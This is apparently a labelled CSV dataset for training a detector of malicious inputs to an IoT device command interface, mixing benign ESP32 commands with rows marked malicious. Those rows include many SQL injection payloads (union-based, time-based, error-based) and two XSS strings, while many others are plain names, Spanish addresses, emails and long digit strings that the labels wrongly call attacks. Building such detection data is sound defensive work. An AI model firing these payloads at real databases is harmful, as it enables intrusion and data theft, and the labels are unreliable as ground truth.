payload,label,attack_type
"-9566%"") union all select 7973,7973,7973,7973--",malicious,cmd_parse_error
"-9725') union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",malicious,cmd_parse_error
"run_cmd, echo ['esp32']",benign,norm
"echo, ['esp32', 'data', 'mqtt']",benign,norm
66091214r,malicious,cmd_parse_error
3099595340897586,malicious,cmd_parse_error
"1'+(select vupb where 9575=9575 union all select null,null,null,null,null,null,null,null,null,null--",malicious,cmd_parse_error
"run_cmd, ADD 538 600",benign,norm
50582,malicious,cmd_parse_error
ringle_ra,malicious,cmd_parse_error
planes fonterosa,malicious,cmd_parse_error
hdbright6,malicious,cmd_parse_error
"echo, ['device', 'data']",benign,norm
"start_temp_report, 74",benign,norm
"echo, ['esp32', 'payload', 'world']",benign,norm
"1"") and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",malicious,cmdi
"run_cmd, ADD 849 952",benign,norm
6429,malicious,cmd_parse_error
"run_cmd, echo ['status', 'esp32', 'ready', 'sensor']",benign,norm
1av48la44r,malicious,cmd_parse_error
"echo, ['ok', 'ready', 'system', 'mqtt']",benign,norm
"run_cmd, echo ['data']",benign,norm
07807880r,malicious,cmd_parse_error
"echo, ['status', 'system', 'data', 'normal']",benign,norm
"-7171%')) union all select 5580,5580,5580,5580,5580,5580,5580,5580--",malicious,cmd_parse_error
"1"") and (3020=3020)*6703 and (""qowc"" like ""qowc",malicious,cmd_parse_error
80u90i9,malicious,cmd_parse_error
03769,malicious,cmd_parse_error
"run_cmd, echo ['data']",benign,norm
danning-marrow@etxarriaranatz.nr,malicious,cmd_parse_error
1%');select (case when (8294=4332) then 1 else 8294*(select 8294 from master..sysdatabases) end)--,malicious,cmdi
"echo, ['report', 'ok', 'hello', 'payload']",benign,norm
"run_cmd, ADD 23 180",benign,norm
"start_temp_report, 107",benign,norm
"run_cmd, ADD 725 343",benign,norm
"echo, ['safe', 'device', 'normal']",benign,norm
"run_cmd, echo ['world']",benign,norm
"run_cmd, echo ['status', 'sensor', 'ok', 'hello']",benign,norm
"run_cmd, echo ['hello', 'iot', 'ping', 'data']",benign,norm
"1'||(select 'epjr' from dual where 3074=3074 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",malicious,cmdi
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,cmdi
"carretera cirera 186,",malicious,cmd_parse_error
"start_temp_report, 73",benign,norm
"start_temp_report, 17",benign,norm
"echo, ['hello', 'status', 'data']",benign,norm
"run_cmd, echo ['data', 'sensor', 'esp32']",benign,norm
"run_cmd, ADD 988 204",benign,norm
-8615))) or 4039=9144,malicious,cmd_parse_error
kaneshir,malicious,cmd_parse_error
"echo, ['iot', 'safe', 'normal']",benign,norm
"echo, ['sensor']",benign,norm
1)) as oqui where 3368=3368 order by 1--,malicious,cmd_parse_error
"run_cmd, echo ['iot', 'ok']",benign,norm
"echo, ['safe', 'payload']",benign,norm
"run_cmd, ADD 309 278",benign,norm
"run_cmd, ADD 499 691",benign,norm
1' in boolean mode);begin user_lock.sleep(5); end--,malicious,cmdi
"run_cmd, ADD 551 122",benign,norm
"run_cmd, echo ['report', 'device']",benign,norm
"1 or 8466=benchmark(5000000,md5(0x694a4745))",malicious,cmd_parse_error
"start_temp_report, 67",benign,norm
biener@926.bo,malicious,cmd_parse_error
mccarthy.darcy@tantomontamontatanto.jo,malicious,cmd_parse_error
almoga,malicious,cmd_parse_error
graziana,malicious,cmd_parse_error
"run_cmd, ADD 644 554",benign,norm
"echo, ['esp32', 'iot', 'report', 'data']",benign,norm
"las delicias 20,",malicious,cmd_parse_error
"run_cmd, echo ['esp32', 'report']",benign,norm
"run_cmd, echo ['ready']",benign,norm
"-6778) as xutm where 6442=6442 union all select 6442,6442,6442,6442,6442,6442#",malicious,cmd_parse_error
"1))) union all select null,null,null--",malicious,cmd_parse_error
"1"";select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",malicious,cmdi
florescu,malicious,cmd_parse_error
"1%"" or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
"echo, ['hello']",benign,norm
"run_cmd, echo ['status', 'ok']",benign,norm
"start_temp_report, 65",benign,norm
"1') as tygi where 9891=9891 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",malicious,cmdi
81403734h,malicious,cmd_parse_error
"start_temp_report, 27",benign,norm
nicolalde llovet,malicious,cmd_parse_error
"run_cmd, ADD 32 65",benign,norm
herreta taul,malicious,cmd_parse_error
"1"")) as khqq where 3637=3637 and 8407=(select count(*) from generate_series(1,5000000))--",malicious,cmd_parse_error
"run_cmd, ADD 885 138",benign,norm
"run_cmd, echo ['hello']",benign,norm
poyales del hoyo,malicious,cmd_parse_error
"-2748')) as gazw where 4624=4624 union all select 4624,4624#",malicious,cmd_parse_error
holder,malicious,cmd_parse_error
"-6600') union all select 5566,5566#",malicious,cmd_parse_error
"run_cmd, echo ['iot', 'status', 'sensor']",benign,norm
"run_cmd, echo ['ready', 'safe', 'data', 'normal']",benign,norm
"1) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (2868=2868",malicious,cmdi
1'))) rlike sleep(5) and ((('rozr' like 'rozr,malicious,cmd_parse_error
impenetr-abilidad,malicious,cmd_parse_error
"echo, ['device', 'system']",benign,norm
"run_cmd, echo ['data', 'hello', 'ping']",benign,norm
"<keygen id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>",malicious,cmdi
"echo, ['data', 'ping']",benign,norm
foody@cup-id.sd,malicious,cmd_parse_error
"start_temp_report, 88",benign,norm
"run_cmd, echo ['ok', 'payload', 'status', 'device']",benign,norm
"run_cmd, ADD 861 852",benign,norm
1') as tqdg where 9355=9355;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,malicious,cmdi
"c/ codigo correspondencia oficial correos-telegrafos 71, 10d",malicious,cmd_parse_error
kunkel,malicious,cmd_parse_error
"run_cmd, ADD 282 448",benign,norm
"echo, ['esp32', 'data', 'payload']",benign,norm
-7779') where 4976=4976 or 6872=6872--,malicious,cmd_parse_error
"1%"");waitfor delay '0:0:5' and (""%""=""",malicious,cmdi
1) as tngy where 8956=8956 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,malicious,cmd_parse_error
"echo, ['iot', 'world', 'ready']",benign,norm
"start_temp_report, 59",benign,norm
16160,malicious,cmd_parse_error
2289,malicious,cmd_parse_error
"echo, ['esp32', 'safe']",benign,norm
"1""))) union all select null,null,null,null,null,null--",malicious,cmd_parse_error
tonicidad,malicious,cmd_parse_error
"start_temp_report, 4",benign,norm
7057231009442608,malicious,cmd_parse_error
"run_cmd, ADD 37 972",benign,norm
"start_temp_report, 72",benign,norm
yunn-tzu,malicious,cmd_parse_error
27306256n,malicious,cmd_parse_error
c/ juan perez arriete 19 13e,malicious,cmd_parse_error
marielle,malicious,cmd_parse_error
"run_cmd, ADD 707 839",benign,norm
50245802w,malicious,cmd_parse_error
narrillos del lamo,malicious,cmd_parse_error
"start_temp_report, 46",benign,norm
"run_cmd, echo ['hello', 'report', 'normal', 'data']",benign,norm
"run_cmd, echo ['ping', 'world', 'ok']",benign,norm
1) where 3381=3381;select pg_sleep(5)--,malicious,cmdi
"run_cmd, echo ['ping']",benign,norm
"run_cmd, echo ['status', 'safe', 'hello']",benign,norm
1' rlike (select * from (select(sleep(5)))sgvo),malicious,cmd_parse_error
-6529') or (4309=1601)*1601,malicious,cmd_parse_error
"start_temp_report, 56",benign,norm
gata,malicious,cmd_parse_error
"start_temp_report, 32",benign,norm
"run_cmd, ADD 33 195",benign,norm
"start_temp_report, 71",benign,norm
"1%"") or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,cmd_parse_error
"1')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('uvlu'='uvlu",malicious,cmdi
"start_temp_report, 104",benign,norm
"run_cmd, echo ['ok', 'world', 'normal', 'system']",benign,norm
castroverde,malicious,cmd_parse_error
"run_cmd, echo ['ok', 'device', 'safe']",benign,norm
"start_temp_report, 55",benign,norm
"start_temp_report, 17",benign,norm
"-7324) or make_set(8486=6544,6544)",malicious,cmd_parse_error
ginest baquedano,malicious,cmd_parse_error
"run_cmd, echo ['esp32', 'hello']",benign,norm
"run_cmd, echo ['sensor', 'status', 'ready']",benign,norm
"1'+(select kzgg where 5070=5070;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,cmdi
"echo, ['system']",benign,norm
"run_cmd, ADD 200 631",benign,norm
kamber@weat.gd,malicious,cmd_parse_error
"start_temp_report, 53",benign,norm
"run_cmd, ADD 845 695",benign,norm
"run_cmd, ADD 919 443",benign,norm
"run_cmd, ADD 7 507",benign,norm
"echo, ['mqtt', 'status']",benign,norm
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# rhli",malicious,cmdi
"start_temp_report, 29",benign,norm
18440,malicious,cmd_parse_error
"run_cmd, ADD 530 867",benign,norm
"start_temp_report, 39",benign,norm
landolfi ribas,malicious,cmd_parse_error
"run_cmd, ADD 460 172",benign,norm
"start_temp_report, 96",benign,norm
"run_cmd, echo ['esp32', 'normal', 'ready', 'report']",benign,norm
"run_cmd, ADD 511 963",benign,norm
3581922362739971,malicious,cmd_parse_error
"start_temp_report, 11",benign,norm
1' and (3020=3020)*6703 and 'hnvf'='hnvf,malicious,cmd_parse_error
"pasaje trigueros, 170,",malicious,cmd_parse_error
1924183185163738,malicious,cmd_parse_error
lezama,malicious,cmd_parse_error
r8u9c5,malicious,cmd_parse_error
"run_cmd, ADD 23 332",benign,norm
"1"") as jaxh where 6318=6318 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",malicious,cmd_parse_error
thimeos siurana,malicious,cmd_parse_error
vitriago iribe,malicious,cmd_parse_error
1') where 1917=1917 union all select null#,malicious,cmd_parse_error
1') where 3588=3588;begin user_lock.sleep(5); end--,malicious,cmdi
"1)) as xsyk where 2575=2575 or 8156=(select count(*) from generate_series(1,5000000))--",malicious,cmd_parse_error
"echo, ['ping']",benign,norm
"run_cmd, ADD 899 947",benign,norm
"-9861' union all select 5710,5710,5710,5710,5710--",malicious,cmd_parse_error
87,malicious,cmd_parse_error
"echo, ['world']",benign,norm
07529,malicious,cmd_parse_error
"-8448%"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""%""=""",malicious,cmdi
3600920272663929,malicious,cmd_parse_error
"run_cmd, ADD 435 43",benign,norm
5258739000426196,malicious,cmd_parse_error
"start_temp_report, 92",benign,norm
"run_cmd, echo ['world', 'ping', 'iot']",benign,norm
"<body onload=""document.cookie=true;"">",malicious,cmdi
"run_cmd, echo ['report']",benign,norm
"run_cmd, echo ['safe']",benign,norm
4551401932172135,malicious,cmd_parse_error
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ('lbwh'='lbwh",malicious,cmd_parse_error
"run_cmd, ADD 924 131",benign,norm
"run_cmd, echo ['ping', 'mqtt']",benign,norm
"run_cmd, ADD 768 876",benign,norm
"start_temp_report, 60",benign,norm
"run_cmd, ADD 479 840",benign,norm
46712,malicious,cmd_parse_error
"run_cmd, ADD 273 874",benign,norm
"pl. don fernando, s/n,",malicious,cmd_parse_error
sollana,malicious,cmd_parse_error
38757754v,malicious,cmd_parse_error
"echo, ['payload']",benign,norm
"run_cmd, ADD 832 206",benign,norm
sabel,malicious,cmd_parse_error
s16nio5o,malicious,cmd_parse_error
"echo, ['ping', 'safe']",benign,norm
"start_temp_report, 16",benign,norm
"start_temp_report, 94",benign,norm
brent@ladigianni.cc,malicious,cmd_parse_error
"start_temp_report, 16",benign,norm
"run_cmd, echo ['world', 'data', 'normal']",benign,norm
26329,malicious,cmd_parse_error
"1"")) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((""ladc"" like ""ladc",malicious,cmd_parse_error
"run_cmd, echo ['data', 'sensor']",benign,norm
"-6463""))) union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",malicious,cmd_parse_error
villarrasa,malicious,cmd_parse_error
1563947873431208,malicious,cmd_parse_error
81621470j,malicious,cmd_parse_error
in4o75u1t4!bili0a1,malicious,cmd_parse_error
"run_cmd, echo ['esp32']",benign,norm
beique,malicious,cmd_parse_error
emperador,malicious,cmd_parse_error
22361,malicious,cmd_parse_error
"run_cmd, ADD 292 409",benign,norm
"start_temp_report, 104",benign,norm
naresh,malicious,cmd_parse_error
5509893161352437,malicious,cmd_parse_error
"start_temp_report, 9",benign,norm
8936821736408974,malicious,cmd_parse_error
"run_cmd, ADD 265 831",benign,norm
"1"" where 7828=7828;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",malicious,cmdi
alfama,malicious,cmd_parse_error
"start_temp_report, 98",benign,norm
iorgo,malicious,cmd_parse_error
"run_cmd, ADD 60 561",benign,norm
3933219208280602,malicious,cmd_parse_error
"start_temp_report, 10",benign,norm
flo3a,malicious,cmd_parse_error
1 where 7299=7299 rlike sleep(5)--,malicious,cmd_parse_error
"run_cmd, echo ['iot', 'payload', 'data', 'system']",benign,norm
1%' rlike (select * from (select(sleep(5)))vwyq)#,malicious,cmd_parse_error
"1%')) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
48210,malicious,cmd_parse_error
"1')) as fcjk where 7755=7755;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",malicious,cmdi
"echo, ['report']",benign,norm
"echo, ['device', 'hello', 'ping']",benign,norm
"run_cmd, ADD 28 378",benign,norm
"run_cmd, ADD 74 187",benign,norm
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('lmoh' like 'lmoh",malicious,cmd_parse_error
"start_temp_report, 60",benign,norm
"1%"")) and 4595=4595#",malicious,cmd_parse_error
9228046254742614,malicious,cmd_parse_error
"run_cmd, echo ['safe', 'ready', 'normal']",benign,norm
3141141898028856,malicious,cmd_parse_error
"run_cmd, echo ['system', 'data', 'hello', 'device']",benign,norm
"run_cmd, echo ['esp32', 'ok']",benign,norm
"run_cmd, ADD 692 346",benign,norm
"1%'))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,cmdi
masvidal canino,malicious,cmd_parse_error
"1""))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",malicious,cmd_parse_error
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('ekqv'='ekqv",malicious,cmdi
"run_cmd, ADD 353 369",benign,norm
"run_cmd, ADD 782 983",benign,norm
"1') as khaa where 8157=8157 and 2388=benchmark(5000000,md5(0x6d457153))#",malicious,cmd_parse_error
"echo, ['mqtt', 'sensor', 'world', 'report']",benign,norm
1)));(select * from (select(sleep(5)))acdk)#,malicious,cmdi
4436070714409479,malicious,cmd_parse_error
"start_temp_report, 97",benign,norm
"1) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",malicious,cmd_parse_error
"run_cmd, ADD 432 294",benign,norm
"echo, ['ready', 'normal']",benign,norm
"start_temp_report, 14",benign,norm
"rec 64,",malicious,cmd_parse_error
1) as ztrb where 1052=1052 and (select * from (select(sleep(5)))gcrr)#,malicious,cmd_parse_error
"-1668""))) or 9323=9323#",malicious,cmd_parse_error
"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",malicious,cmd_parse_error
defrance,malicious,cmd_parse_error
t443,malicious,cmd_parse_error
"run_cmd, ADD 580 888",benign,norm
"echo, ['sensor', 'ok', 'hello', 'normal']",benign,norm
"run_cmd, echo ['system', 'esp32', 'safe']",benign,norm
"run_cmd, ADD 447 983",benign,norm
calle virgen de la macarena 72 2-c,malicious,cmd_parse_error
1') rlike sleep(5) and ('qsub' like 'qsub,malicious,cmd_parse_error
"run_cmd, echo ['ping', 'ready']",benign,norm
"run_cmd, ADD 389 610",benign,norm
cuarter8da,malicious,cmd_parse_error
84082482w,malicious,cmd_parse_error
"run_cmd, ADD 337 571",benign,norm
"1'||(select 'hwdj' where 8179=8179;iif(3447=1084,1,1/0)",malicious,cmdi
jabbari,malicious,cmd_parse_error
"run_cmd, echo ['mqtt', 'normal', 'ping', 'payload']",benign,norm
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'zjxk'='zjxk",malicious,cmd_parse_error
"run_cmd, echo ['device']",benign,norm
"echo, ['payload', 'data', 'device', 'ok']",benign,norm
pajo,malicious,cmd_parse_error
"echo, ['system', 'ok', 'payload']",benign,norm
baryshnikov@lola-lutscht.es,malicious,cmd_parse_error
41484237b,malicious,cmd_parse_error
"1%"" union all select null,null,null,null,null,null,null--",malicious,cmd_parse_error
"echo, ['world', 'esp32', 'sensor']",benign,norm
"run_cmd, ADD 41 334",benign,norm
4291273223594568,malicious,cmd_parse_error
"run_cmd, ADD 318 360",benign,norm
"start_temp_report, 66",benign,norm
-6755) or 9323=9323#,malicious,cmd_parse_error
9695488884758445,malicious,cmd_parse_error
"run_cmd, echo ['sensor', 'hello']",benign,norm
-4896') union all select 1929--,malicious,cmd_parse_error
"echo, ['world', 'status']",benign,norm
"echo, ['normal', 'payload']",benign,norm
"run_cmd, echo ['ok', 'device', 'normal', 'ping']",benign,norm
dunn,malicious,cmd_parse_error
97963158v,malicious,cmd_parse_error
estof6d94a,malicious,cmd_parse_error
wayca,malicious,cmd_parse_error
yevtushenko-pegna@corjet.al,malicious,cmd_parse_error
1 where 5359=5359 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,malicious,cmdi
"run_cmd, ADD 469 211",benign,norm
"1));select benchmark(5000000,md5(0x714e4153))#",malicious,cmdi
"echo, ['status', 'system']",benign,norm
heicy,malicious,cmd_parse_error
65781436x,malicious,cmd_parse_error
"1%"")));select pg_sleep(5) and (((""%""=""",malicious,cmdi
"start_temp_report, 75",benign,norm
"1');select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmdi
"echo, ['ok', 'device', 'status']",benign,norm
25175,malicious,cmd_parse_error
"start_temp_report, 80",benign,norm
tilbrook@saludyfitness.pr,malicious,cmd_parse_error
"-1722' union all select 1408,1408,1408#",malicious,cmd_parse_error
"1"" union all select null,null,null#",malicious,cmd_parse_error
23266,malicious,cmd_parse_error
66866648j,malicious,cmd_parse_error
"echo, ['device']",benign,norm
"run_cmd, ADD 332 413",benign,norm
"echo, ['safe', 'status']",benign,norm
"run_cmd, echo ['world', 'ok', 'payload']",benign,norm
pinilla de los barruecos,malicious,cmd_parse_error
"-8894%"")) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""%""=""",malicious,cmdi
"run_cmd, echo ['iot']",benign,norm
"start_temp_report, 93",benign,norm
rio jarama 194 6-h,malicious,cmd_parse_error
3323,malicious,cmd_parse_error
"1"";select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",malicious,cmdi
"-8794))) union all select 5802,5802,5802--",malicious,cmd_parse_error
"run_cmd, echo ['esp32', 'device']",benign,norm
6180,malicious,cmd_parse_error
6708008477094577,malicious,cmd_parse_error
8789249856609623,malicious,cmd_parse_error
"start_temp_report, 42",benign,norm
"echo, ['world', 'mqtt', 'esp32', 'report']",benign,norm
le?gionario,malicious,cmd_parse_error
katherina,malicious,cmd_parse_error
calle palencia s/n,malicious,cmd_parse_error
"run_cmd, ADD 467 993",benign,norm
8352337916705491,malicious,cmd_parse_error
2354,malicious,cmd_parse_error
"echo, ['status', 'payload', 'iot']",benign,norm
"run_cmd, ADD 193 123",benign,norm
"run_cmd, echo ['ok', 'safe', 'iot']",benign,norm
"run_cmd, ADD 92 345",benign,norm
"echo, ['system', 'hello', 'normal', 'payload']",benign,norm
"run_cmd, echo ['payload']",benign,norm
3423,malicious,cmd_parse_error
"run_cmd, echo ['normal']",benign,norm
"1'))) and elt(2506=2383,2383) and ((('bjrj'='bjrj",malicious,cmd_parse_error
"run_cmd, ADD 221 496",benign,norm
"1')) union all select null,null,null,null,null,null,null,null,null#",malicious,cmd_parse_error
"1'||(select 'zbdv' where 1618=1618 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))||'",malicious,cmdi
688,malicious,cmd_parse_error
"start_temp_report, 76",benign,norm
ozmond-woolgar@adscrito.tj,malicious,cmd_parse_error
"run_cmd, echo ['world', 'ready', 'status', 'ok']",benign,norm
46415307l,malicious,cmd_parse_error
1'+(select nsri where 1202=1202 and 4595=4595#,malicious,cmd_parse_error
"start_temp_report, 17",benign,norm
"echo, ['ok', 'safe', 'hello', 'device']",benign,norm
4129931718756477,malicious,cmd_parse_error
5402,malicious,cmd_parse_error
"run_cmd, echo ['sensor', 'device', 'ready', 'normal']",benign,norm
"run_cmd, ADD 862 75",benign,norm
walker,malicious,cmd_parse_error
"echo, ['system']",benign,norm
"start_temp_report, 83",benign,norm
vinko,malicious,cmd_parse_error
"run_cmd, echo ['esp32', 'sensor', 'data']",benign,norm
"start_temp_report, 7",benign,norm
"start_temp_report, 107",benign,norm
santibez de bjar,malicious,cmd_parse_error
"1) as rbmn where 5948=5948 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
"run_cmd, ADD 919 510",benign,norm
"run_cmd, echo ['sensor', 'esp32', 'device', 'hello']",benign,norm
nadir,malicious,cmd_parse_error
"echo, ['hello', 'status', 'world', 'device']",benign,norm
"run_cmd, ADD 17 377",benign,norm
"calle rocafort, 169 4c",malicious,cmd_parse_error
riudellots de la selva,malicious,cmd_parse_error
"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",malicious,cmd_parse_error
yaci,malicious,cmd_parse_error
fuente-lamo,malicious,cmd_parse_error
"run_cmd, echo ['hello']",benign,norm
"start_temp_report, 51",benign,norm
"start_temp_report, 59",benign,norm
54057566e,malicious,cmd_parse_error
"1""))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
"1'))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('qfvg'='qfvg",malicious,cmdi
"1) or 8156=(select count(*) from generate_series(1,5000000))--",malicious,cmd_parse_error
"start_temp_report, 113",benign,norm
1'))) and (select * from (select(sleep(5)))gcrr)#,malicious,cmd_parse_error
"1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('nlfl' like 'nlfl",malicious,cmd_parse_error
"start_temp_report, 21",benign,norm
"run_cmd, ADD 596 395",benign,norm
"echo, ['sensor']",benign,norm
netty9,malicious,cmd_parse_error
"run_cmd, echo ['hello', 'data', 'mqtt', 'system']",benign,norm
"1%')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('%'='",malicious,cmd_parse_error
"-4031""))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""auhn""=""auhn",malicious,cmd_parse_error
"echo, ['device', 'safe', 'status']",benign,norm
"-9749"" where 7083=7083 or make_set(7577=1182,1182)--",malicious,cmd_parse_error
"1')) and elt(6847=5874,5874) and (('yspu'='yspu",malicious,cmd_parse_error
"run_cmd, ADD 1 72",benign,norm
carrer de merida 35 8-c,malicious,cmd_parse_error
"1' where 8083=8083 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",malicious,cmd_parse_error
"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",malicious,cmd_parse_error
"run_cmd, ADD 109 471",benign,norm
"start_temp_report, 16",benign,norm
"c/ forjadores, 131",malicious,cmd_parse_error
papa@opel-e-flex.cg,malicious,cmd_parse_error
"start_temp_report, 63",benign,norm
"start_temp_report, 13",benign,norm
"1"");waitfor delay '0:0:5' and (""dmcu""=""dmcu",malicious,cmdi
cabal urrupan,malicious,cmd_parse_error
"echo, ['system', 'device']",benign,norm
1 union all select null#,malicious,cmd_parse_error
"start_temp_report, 26",benign,norm
"1) as mpnj where 5049=5049;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmdi
"echo, ['ping', 'ready']",benign,norm
"echo, ['mqtt']",benign,norm
probtica,malicious,cmd_parse_error
"echo, ['ping']",benign,norm
"run_cmd, ADD 507 948",benign,norm
"1)) and make_set(8554=3286,3286) and ((7385=7385",malicious,cmd_parse_error
2368,malicious,cmd_parse_error
"run_cmd, ADD 275 800",benign,norm
"run_cmd, echo ['ok', 'payload', 'safe']",benign,norm
"start_temp_report, 8",benign,norm
"run_cmd, echo ['device']",benign,norm
"1""));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,cmdi
"start_temp_report, 86",benign,norm
"echo, ['sensor', 'system']",benign,norm
c/ otoo 117 8-h,malicious,cmd_parse_error
rtova,malicious,cmd_parse_error
"echo, ['data', 'esp32', 'world', 'mqtt']",benign,norm
"run_cmd, ADD 949 209",benign,norm
"1'))) union all select null,null,null,null,null,null,null,null--",malicious,cmd_parse_error
"echo, ['world', 'ok']",benign,norm
"start_temp_report, 35",benign,norm
"run_cmd, ADD 264 834",benign,norm
"run_cmd, ADD 848 904",benign,norm
lynnell,malicious,cmd_parse_error
"start_temp_report, 33",benign,norm
"run_cmd, echo ['safe', 'iot', 'sensor', 'status']",benign,norm
"echo, ['sensor', 'system', 'safe']",benign,norm
"start_temp_report, 43",benign,norm
"run_cmd, echo ['device', 'ok', 'system']",benign,norm
kussauer_brereton@showcarsmadrid.com.kp,malicious,cmd_parse_error
souren,malicious,cmd_parse_error
1')) as nsfx where 9553=9553 rlike sleep(5)--,malicious,cmd_parse_error
c/ espiritu santo 126,malicious,cmd_parse_error
1064,malicious,cmd_parse_error
"echo, ['sensor']",benign,norm
